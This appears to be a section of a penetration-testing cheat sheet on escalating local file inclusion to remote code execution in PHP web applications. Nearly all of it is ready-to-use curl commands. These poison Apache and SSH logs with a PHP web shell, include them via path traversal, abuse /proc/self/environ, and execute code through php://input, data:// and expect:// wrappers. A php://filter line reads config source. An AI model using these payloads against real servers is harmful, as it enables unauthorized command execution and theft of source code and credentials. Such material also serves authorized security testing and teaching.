# Phase 8: LFI to RCE Escalation

#### Log Poisoning

```bash
# Inject PHP code into logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include Apache log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Include auth.log (SSH)
# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Inject via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP Wrapper Exploitation

```bash
# php://filter - Read source code as base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Execute POST data as PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Execute system commands
curl "http://target.com/page?file=expect://id"
```